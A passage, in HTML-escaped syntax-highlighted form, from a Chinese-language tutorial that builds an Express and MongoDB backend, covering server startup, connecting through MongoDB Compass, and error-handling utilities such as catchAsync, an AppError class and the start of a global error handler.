&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;port&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;env&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;PORT&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;listen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`应用运行在端口&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;port&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;server.js文件负责处理所有与服务器相关的功能和逻辑。从上面的代码中，server.js文件使用dotenv加载环境变量，使用mongoose将后端连接到MongoDB，并启动Express服务器。它从config.env文件获取数据库URL和端口，连接到数据库，然后在指定端口(8000)上运行您的应用。&lt;/p&gt;
&lt;p&gt;如果找不到指定端口，则回退到端口3000，并将确认消息打印到控制台，指示服务器已在指定端口上启动并运行。&lt;/p&gt;
&lt;h3 id=&#34;将数据库连接到mongodb-compass&#34;&gt;将数据库连接到MongoDB Compass
&lt;/h3&gt;&lt;p&gt;首先，下载MongoDB Compass应用。(前往此处下载并安装：https://www.mongodb.com/try/download/compass)。MongoDB Compass应用使我们易于管理数据。&lt;/p&gt;
&lt;p&gt;安装完成后，打开应用并点击Click to add new connection。转到您的.env文件，复制最初设置MongoDB时获得的连接字符串，将其粘贴到URL部分，然后点击&amp;quot;connect&amp;rdquo;。此设置帮助您在创建和删除用户时管理数据。&lt;/p&gt;
&lt;h3 id=&#34;设置高级错误处理方法&#34;&gt;设置高级错误处理方法
&lt;/h3&gt;&lt;p&gt;您现在将创建一个高级错误处理机制。为此，在后端创建一个utils文件夹，在utils文件夹中创建一个catchAsync.js文件，并添加此代码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//catchAsync.js
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;module&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;exports&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;fn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;fn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;接下来，仍在utils文件夹中创建一个appError.js文件。在appError.js文件中，添加以下命令：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;AppError&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Error&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;constructor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;statusCode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kr&#34;&gt;super&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;statusCode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;statusCode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;status&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;statusCode&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;startsWith&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;4&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;?&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;fail&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;error&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isOperational&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;Error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;captureStackTrace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;constructor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;module&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;exports&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;AppError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;上面的代码有助于跟踪和追踪错误。它还提供错误可能发生的URL和文件位置，有助于更清晰的错误处理和调试。&lt;/p&gt;
&lt;p&gt;接下来，让我们创建一个全局错误处理程序。首先在后端目录中创建一个新文件夹，命名为&amp;quot;controller&amp;quot;。在controller文件夹中，创建您的全局错误处理文件。您可以随意命名。在此示例中，它称为globalErrorHandler.js。&lt;/p&gt;
&lt;p&gt;您的globalErrorHandler文件将定义几个处理特定错误类型的函数，如数据库问题、验证失败甚至JWT问题，并为用户返回格式良好的错误响应。为了使globalErrorHandler正常工作，您必须创建一个控制器函数。&lt;/p&gt;
&lt;p&gt;因此，接下来，创建一个errorController.js文件(仍在controller文件夹内)。errorController.js文件在捕获错误时向用户响应，以JSON格式发送错误。&lt;/p&gt;
&lt;p&gt;globalErrorHandler.js:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// globalErrorHandler.js
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;AppError&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;../utils/appError&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;handleCastErrorDB&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;message&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`无效的&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;.`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;AppError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;400&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;handleDuplicateFieldsDB&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;value&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;keyValue&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;?&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;JSON&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;stringify&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;keyValue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;重复字段&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;message&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`重复字段值: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;. 请使用另一个值!`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;AppError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;400&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;handleValidationErrorDB&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;errors&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;values&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;errors&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;map&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;el&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span 